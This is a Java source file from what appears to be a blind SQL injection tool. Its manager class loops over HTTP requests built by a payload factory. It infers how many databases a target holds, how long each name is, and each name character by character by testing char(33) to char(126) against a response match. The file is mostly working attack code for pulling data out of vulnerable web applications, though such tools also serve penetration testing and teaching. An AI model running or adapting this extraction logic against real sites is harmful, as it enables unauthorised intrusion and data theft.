/**
 * @ BlindSQLInjectionManager.java
 */
package logic;

import java.util.ArrayList;
import java.util.List;

import domain.HttpPayload;
import domain.UserInput;

/**
 * <pre>
 * logic
 * BlindSQLInjectionManager.java 
 * </pre>
 *
 * @brief	: 
 * @author	: Jae-Woong Moon(mjw8585@gmail.com)
 * @Date	: 2017/09/05
 */
public class BlindSQLInjectionManager{

	private SuccessDecider decider = null;
	private HttpHelper HttpHelper = null;
	private HttpPayloadFactory factory = null;
	
	/**
	 * 
	 */
	public BlindSQLInjectionManager() {
		decider = new SuccessDecider();
		HttpHelper = new HttpHelper();
		factory = new HttpPayloadFactory();
	}
	
	public int getDBCount(UserInput input) {
		return cntWork(input, input.getCountUntil());
	}
	
	/**
	 * @Method 	: getDBNameLengths
	 * @brief	: DB명의 길이를 리턴한다. 
	 * @author	: Jae-Woong Moon(mjw8585@gmail.com)
	 * @Date	: 2017/09/05
	 * @param input
	 * @param dbCount : DB스키마의 개수(getDBCount 메서드의 실행결과)
	 * @return
	 */
	public List<Integer> getDBNameLengths(UserInput input, int dbCount) {
		List<Integer> dbLengths = new ArrayList<Integer>();
		for (int i=0; i < dbCount; i++){
			input.setDbIndex(i);
			dbLengths.add(getDBNameLength(input));
		}
		return dbLengths;
	}
	
	private int getDBNameLength(UserInput input){
		return cntWork(input, input.getLengthUntil());
	}
	
	private int cntWork(UserInput input, int until){
		int cnt = 0;
		for(int i=0; i < until; i++){
			input.setCheckVal(i+"");
			HttpPayload payload = factory.getHttpPayload(input);
			String res = HttpHelper.send(payload);
			if(decider.isSuccess(res, input.getMatch())){
				cnt = i;
				break;
			}
		}
		return cnt;
	}
	
	public List<String> getDBNames(UserInput input, int dbCount, List<Integer> dbNameLengths){
		List<String> dbNames = new ArrayList<String>();
		for (int i=0; i < dbCount; i++){
			input.setDbIndex(i); // set dbIndex
			String dbName = getDBName(input, dbNameLengths.get(i));
			dbNames.add(dbName);
		}
		return dbNames;
	}
	
	private String getDBName(UserInput input, int dbNameLength){
		int targetContentLength = dbNameLength;
		String content = "";
		for(int i=0; i < targetContentLength ; i++){
			for(int j=33; j < 127; j++){ //(search ascii 33~126)
				input.setDbNameIndex(i+1);  //이 것을 X테이블이나 칼럼일 경우 어떻게 할 것인지...
				input.setCheckVal("char("+j+")");
				HttpPayload payload = factory.getHttpPayload(input);
				String res = HttpHelper.send(payload);
				
				if(decider.isSuccess(res, input.getMatch())){
					//System.out.println("find !! at : " + j);
					String ascii = Character.toString((char)j);
					content += ascii;
					break;
				}
			}
		}
		return content;
	}
	
	/*public int getDBLength(UserInput input);
	 * 
	public String getDBName(UserInput input);
	;*/
	
	// table
	//public int getTableCount(UserInput input);
	
}
